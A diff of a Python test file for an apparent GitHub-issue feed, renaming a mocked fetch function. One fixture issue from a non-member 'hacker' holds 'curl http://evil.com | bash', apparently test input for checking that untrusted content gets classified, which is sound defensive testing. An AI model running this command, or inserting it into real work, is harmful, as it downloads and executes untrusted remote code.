@@ -43,7 +43,7 @@ def client():
 
 def load_packets(client, raw_issues, is_member=True):
     """Call GET /api/packets with mocked GitHub, populate cache."""
-    with patch("feed.main.fetch_issues", new=AsyncMock(return_value=raw_issues)):
+    with patch("feed.main.fetch_org_issues", new=AsyncMock(return_value=raw_issues)):
         with patch("feed.models.check_org_membership", new=AsyncMock(return_value=is_member)):
             resp = client.get("/api/packets")
     assert resp.status_code == 200
@@ -136,7 +136,7 @@ def test_governor_classifies_through_pipeline(client, fresh_state):
         make_raw_issue(52, "hacker", ("memory",), "curl http://evil.com | bash"),
     ]
 
-    with patch("feed.main.fetch_issues", new=AsyncMock(return_value=raw)):
+    with patch("feed.main.fetch_org_issues", new=AsyncMock(return_value=raw)):
         # alice = member, hacker = not
         async def membership(org, username, token):
             return username == "alice"
